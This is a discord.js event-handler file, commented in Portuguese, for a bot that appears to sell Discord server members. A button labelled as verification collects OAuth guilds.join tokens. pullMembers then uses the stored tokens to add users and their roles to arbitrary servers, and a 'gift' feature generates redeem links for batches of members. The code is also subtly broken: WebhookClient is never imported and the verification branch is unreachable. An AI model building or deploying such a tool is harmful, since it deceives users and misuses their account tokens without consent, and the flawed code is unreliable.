const { 
    Events, 
    ModalBuilder, 
    ChannelType,
    // --- CORREÇÃO: Componentes que faltavam ---
    EmbedBuilder,
    StringSelectMenuBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    TextInputBuilder,
    TextInputStyle
    // --- FIM DA CORREÇÃO ---
} = require('discord.js');
const { dbWrapper } = require('../../database/database.js');
const { v4: uuidv4 } = require('uuid');
const config = require('../../../config.js');

/**
 * Função para "puxar" membros para um servidor.
 * @param {import('discord.js').Client} client O cliente Discord.
 * @param {string} guildId O ID do servidor para onde puxar.
 * @param {number} amount A quantidade de membros para puxar.
 * @returns {Promise<{success: number, fail: number}>} O resultado da operação.
 */
async function pullMembers(client, guildId, amount) {
    const guild = await client.guilds.fetch(guildId).catch(() => null);
    if (!guild) {
      console.error(`[PullMembers] Servidor ${guildId} não encontrado.`);
      return { success: 0, fail: amount };
    }

    const membersToPull = await dbWrapper.getRandomUsers(amount);
    if (membersToPull.length === 0) {
      console.log('[PullMembers] Nenhum usuário na database para puxar.');
      return { success: 0, fail: amount };
    }

    let successCount = 0;
    let failCount = 0;

    // Constrói o convite (precisa da permissão CREATE_INSTANT_INVITE)
    // Tenta pegar o canal do sistema, ou o primeiro canal de texto
    const channel = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText);
    if (!channel) {
        console.error(`[PullMembers] Nenhum canal encontrado no servidor ${guildId} para criar convite.`);
        return { success: 0, fail: membersToPull.length };
    }
    
    const invite = await channel.createInvite({ maxAge: 300, maxUses: 0 }).catch(err => {
        console.error(`[PullMembers] Falha ao criar convite para ${guildId}: ${err.message}`);
        return null;
    });

    if (!invite) {
        return { success: 0, fail: membersToPull.length };
    }

    for (const user of membersToPull) {
      try {
        await guild.members.add(user.discordId, {
          accessToken: user.accessToken,
          roles: user.roles, // Adiciona os roles que o usuário tinha
        });
        successCount++;
        // Pausa para evitar rate limit
        await new Promise(resolve => setTimeout(resolve, 500)); 
      } catch (error) {
        failCount++;
        console.error(`[PullMembers] Falha ao adicionar ${user.discordId}: ${error.message}`);
        
        // Se o token for inválido, remove o usuário da DB
        if (error.code === 50025 || error.code === 50001) { // Invalid OAuth2 access token or Missing Access
          await dbWrapper.deleteUser(user.discordId);
        }
      }
    }

    return { success: successCount, fail: failCount };
}


// --- Event Handler Principal ---
module.exports = {
  name: Events.InteractionCreate,
  async execute(interaction) {
    
    // 1. Slash Commands
    if (interaction.isChatInputCommand()) {
      const command = interaction.client.commands.get(interaction.commandName);
      if (!command) {
        console.error(`Nenhum comando correspondente a ${interaction.commandName} foi encontrado.`);
        return;
      }
      try {
        await command.execute(interaction);
      } catch (error) {
        console.error(error);
        if (interaction.replied || interaction.deferred) {
          await interaction.followUp({ content: 'Houve um erro ao executar esse comando!', flags: 64 });
        } else {
          await interaction.reply({ content: 'Houve um erro ao executar esse comando!', flags: 64 });
        }
      }
      return;
    }

    // 2. Button Clicks
    if (interaction.isButton()) {
      const customId = interaction.customId;

      // --- Botão: Puxar Membros ---
      if (customId === 'push_members_button') {
        const totalUsers = await dbWrapper.getTotalUsers();
        const modal = new ModalBuilder()
          .setCustomId('push_members_modal')
          .setTitle('Solicitação de Push');
        
        const guildIdInput = new TextInputBuilder()
          .setCustomId('guild_id_input')
          .setLabel("Qual ID do servidor deseja puxar?")
          .setPlaceholder(`Ex: ${interaction.guild.id}`)
          .setStyle(TextInputStyle.Short)
          .setRequired(true);

        const amountInput = new TextInputBuilder()
          .setCustomId('amount_input')
          .setLabel("Qual quantidade deseja puxar?")
          .setPlaceholder(`Usuários disponíveis: ${totalUsers}`)
          .setStyle(TextInputStyle.Short)
          .setRequired(true);
          
        modal.addComponents(
          new ActionRowBuilder().addComponents(guildIdInput),
          new ActionRowBuilder().addComponents(amountInput)
        );
        await interaction.showModal(modal);
      }
      
      // --- Botão: Configurar Servidores ---
      if (customId === 'config_server_button') {
        const config = await dbWrapper.getBotConfig();
        
        const modal = new ModalBuilder()
          .setCustomId('config_server_modal')
          .setTitle('Configurar Servidores e Cargos');

        const mainGuildInput = new TextInputBuilder()
          .setCustomId('main_guild_input')
          .setLabel("ID do Servidor Principal")
          .setStyle(TextInputStyle.Short)
          .setValue(config?.mainGuildId || interaction.guild.id)
          .setRequired(true);
          
        const roleIdInput = new TextInputBuilder()
          .setCustomId('role_id_input')
          .setLabel("ID do Cargo de Verificado (Opcional)")
          .setStyle(TextInputStyle.Short)
          .setValue(config?.verifiedRoleId || '')
          .setRequired(false);

        const logsWebhookInput = new TextInputBuilder()
          .setCustomId('logs_webhook_input')
          .setLabel("URL do Webhook de Logs (Opcional)")
          .setStyle(TextInputStyle.Short)
          .setValue(config?.logsWebhookUrl || '')
          .setRequired(false);

        modal.addComponents(
          new ActionRowBuilder().addComponents(mainGuildInput),
          new ActionRowBuilder().addComponents(roleIdInput),
          new ActionRowBuilder().addComponents(logsWebhookInput)
        );
        await interaction.showModal(modal);
      }
      
      // --- Botão: Criar Gift ---
      if (customId === 'create_gift_button') {
         const totalUsers = await dbWrapper.getTotalUsers();
         const modal = new ModalBuilder()
          .setCustomId('create_gift_modal_v2')
          .setTitle('Generate Gifts Members');
          
        const memberCountInput = new TextInputBuilder()
          .setCustomId('member_count_input')
          .setLabel("Qual quantidade de membros esse gift terá?")
          .setPlaceholder(`Lembre-se: ${totalUsers} Membro(s) disponíveis.`)
          .setStyle(TextInputStyle.Short)
          .setRequired(true);

        const giftCountInput = new TextInputBuilder()
          .setCustomId('gift_count_input')
          .setLabel("Quantos gift(s) quer gerar?")
          .setPlaceholder(`Exemplo: 3`)
          .setStyle(TextInputStyle.Short)
          .setRequired(true);
          
        modal.addComponents(
          new ActionRowBuilder().addComponents(memberCountInput),
          new ActionRowBuilder().addComponents(giftCountInput)
        );
        await interaction.showModal(modal);
      }

      // --- Botão: Enviar Mensagem Auth ---
      if (customId === 'send_embed_button') {
        // Por enquanto, apenas armazena a embed (não configurável)
        const embedData = {
            title: "Verificação do Servidor",
            description: "Clique no botão abaixo para se verificar e ganhar acesso ao servidor.",
            color: 0x5865F2,
            buttonLabel: "Verificar-se"
        };
        await dbWrapper.saveEmbedConfig(embedData);

        const modal = new ModalBuilder()
            .setCustomId('send_embed_channel_modal')
            .setTitle('Enviar Mensagem');
        
        const channelIdInput = new TextInputBuilder()
            .setCustomId('channel_id_input')
            .setLabel("ID do Canal para enviar a mensagem")
            .setPlaceholder("Cole o ID do canal aqui...")
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
            
        modal.addComponents(new ActionRowBuilder().addComponents(channelIdInput));
        await interaction.showModal(modal);
      }
      return;
    }

    // 3. Modal Submissions
    if (interaction.isModalSubmit()) {
      const customId = interaction.customId;

      // --- Modal: Configurar Servidor ---
      if (customId === 'config_server_modal') {
        // CORRIGIDO: 'ephemeral: true' mudou para 'flags: 64'
        await interaction.deferReply({ flags: 64 }); 
        
        const roleId = interaction.fields.getTextInputValue('role_id_input') || null;
        const mainGuildId = interaction.fields.getTextInputValue('main_guild_input');
        const logsWebhookUrl = interaction.fields.getTextInputValue('logs_webhook_input') || null;
        
        await dbWrapper.saveBotConfig({ mainGuildId, verifiedRoleId: roleId, logsWebhookUrl });
        
        await interaction.editReply('Configurações salvas com sucesso!');
      }

      // --- Modal: Criar Gift ---
      if (customId === 'create_gift_modal_v2') {
        // CORRIGIDO: 'ephemeral: true' mudou para 'flags: 64'
        await interaction.deferReply({ flags: 64 }); 

        const memberCount = parseInt(interaction.fields.getTextInputValue('member_count_input'));
        const giftCount = parseInt(interaction.fields.getTextInputValue('gift_count_input'));
        const totalUsers = await dbWrapper.getTotalUsers();

        if (isNaN(memberCount) || memberCount <= 0) {
            return interaction.editReply('A quantidade de membros deve ser um número maior que zero.');
        }
        if (isNaN(giftCount) || giftCount <= 0) {
            return interaction.editReply('A quantidade de gifts deve ser um número maior que zero.');
        }
        if (memberCount > totalUsers) {
            return interaction.editReply(`Você não pode criar um gift com ${memberCount} membros, pois você só tem ${totalUsers} usuários válidos.`);
        }

        let links = '';
        for (let i = 0; i < giftCount; i++) {
            const code = uuidv4();
            await dbWrapper.createGift(code, memberCount);
            links += `${config.BASE_URL}/redeem/${code}\n`;
        }

        // Tenta enviar DM
        try {
            await interaction.user.send(`**Seus ${giftCount} links de gift foram gerados:**\n\n${links}`);
            await interaction.editReply(`Sucesso! Enviei ${giftCount} links de gift para sua DM.`);
        } catch (error) {
            // Se falhar, envia no canal (ephemeral)
            console.warn(`Falha ao enviar DM para ${interaction.user.id}, enviando no canal.`);
            await interaction.editReply(`Não foi possível enviar para sua DM (ela está fechada?).\n**Seus ${giftCount} links de gift:**\n\n${links}`);
        }
      }
      
      // --- Modal: Puxar Membros ---
      if (customId === 'push_members_modal') {
          // CORRIGIDO: 'ephemeral: true' mudou para 'flags: 64'
          await interaction.deferReply({ flags: 64 }); 

          const guildId = interaction.fields.getTextInputValue('guild_id_input');
          const amount = parseInt(interaction.fields.getTextInputValue('amount_input'));
          const totalUsers = await dbWrapper.getTotalUsers();

          if (isNaN(amount) || amount <= 0) {
              return interaction.editReply('A quantidade deve ser um número maior que zero.');
          }
          if (amount > totalUsers) {
              return interaction.editReply(`Você não pode puxar ${amount} membros, pois você só tem ${totalUsers} usuários válidos.`);
          }

          const guild = await interaction.client.guilds.fetch(guildId).catch(() => null);
          if (!guild) {
              return interaction.editReply('O ID do servidor fornecido é inválido ou o bot não está nele.');
          }

          await interaction.editReply(`Iniciando o push de \`${amount}\` membros para o servidor \`${guild.name}\`. Isso pode levar um tempo...`);

          // Executa o push (não bloqueia a resposta)
          pullMembers(interaction.client, guildId, amount).then(result => {
              const followUpMsg = `Push concluído para \`${guild.name}\`:\n- ✅ \`${result.success}\` membros adicionados.\n- ❌ \`${result.fail}\` falharam (tokens expirados ou já estavam no servidor).`;
              
              // Envia o follow-up para o canal original
              interaction.followUp({ content: followUpMsg, flags: 64 });
              
              // Tenta enviar log via Webhook (se configurado)
              dbWrapper.getBotConfig().then(config => {
                  if (config?.logsWebhookUrl) {
                      const webhookClient = new WebhookClient({ url: config.logsWebhookUrl });
                      webhookClient.send({
                          content: `Relatório de Push (Admin: ${interaction.user.tag})`,
                          embeds: [
                              new EmbedBuilder()
                                  .setTitle('Push Manual Concluído')
                                  .setColor('Green')
                                  .addFields(
                                      { name: 'Servidor Alvo', value: `${guild.name} (${guild.id})` },
                                      { name: 'Membros Adicionados', value: `\`${result.success}\``, inline: true },
                                      { name: 'Falhas', value: `\`${result.fail}\``, inline: true }
                                  )
                                  .setTimestamp()
                          ]
                      }).catch(console.error);
                  }
              });
          });
      }

      // --- Modal: Perguntando Canal para Enviar ---
      if (customId === 'send_embed_channel_modal') {
          // CORRIGIDO: 'ephemeral: true' mudou para 'flags: 64'
          await interaction.deferReply({ flags: 64 }); 

          const channelId = interaction.fields.getTextInputValue('channel_id_input');
          const channel = await interaction.client.channels.fetch(channelId).catch(() => null);

          if (!channel || channel.type !== ChannelType.GuildText) {
              return interaction.editReply('O ID do canal é inválido ou não é um canal de texto.');
          }

          // Pega a embed salva
          const embedData = await dbWrapper.getEmbedConfig();
          if (!embedData) {
              return interaction.editReply('Nenhuma configuração de embed encontrada. (Isso é um erro interno).');
          }

          const embed = new EmbedBuilder()
              .setTitle(embedData.title)
              .setDescription(embedData.description)
              .setColor(embedData.color);

          const row = new ActionRowBuilder()
              .addComponents(
                  new ButtonBuilder()
                      .setCustomId('auth_verify_button') // Botão de verificação real
                      .setLabel(embedData.buttonLabel)
                      .setStyle(ButtonStyle.Success)
                      .setEmoji('✅')
              );

          try {
              await channel.send({ embeds: [embed], components: [row] });
              await interaction.editReply(`Mensagem enviada com sucesso para o canal ${channel.name}!`);
          } catch (error) {
              console.error(error);
              await interaction.editReply('Falha ao enviar mensagem. Verifique se eu tenho permissão de "Enviar Mensagens" e "Ver Canal" neste canal.');
          }
      }
      return;
    }

    // 4. Interação com Botão de Verificação (Auth)
    if (interaction.isButton() && interaction.customId === 'auth_verify_button') {
        const state = uuidv4(); // Gera um ID único para esta tentativa de auth
        // Salva o ID do usuário e do servidor no state (para usar no callback)
        await dbWrapper.saveAuthState(state, interaction.user.id, interaction.guild.id);

        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${state}`;

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('Autorizar Conexão')
                    .setStyle(ButtonStyle.Link)
                    .setURL(authUrl)
            );
        
        // CORRIGIDO: 'ephemeral: true' mudou para 'flags: 64'
        await interaction.reply({
            content: 'Clique no botão abaixo para autorizar a conexão com sua conta do Discord.',
            components: [row],
            flags: 64
        });
    }

  },
};